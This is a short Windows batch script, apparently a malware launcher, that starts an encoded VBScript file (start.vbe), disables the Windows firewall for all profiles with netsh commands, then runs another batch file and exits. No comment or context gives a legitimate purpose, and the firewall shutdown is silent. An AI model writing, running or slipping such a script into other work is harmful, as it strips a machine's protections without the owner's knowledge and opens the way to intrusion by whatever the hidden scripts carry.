@echo off
start.vbe
netsh firewall set opmode mode=disable profile=ALL
netsh firewall set opmode mode=disable
start.bat
exit
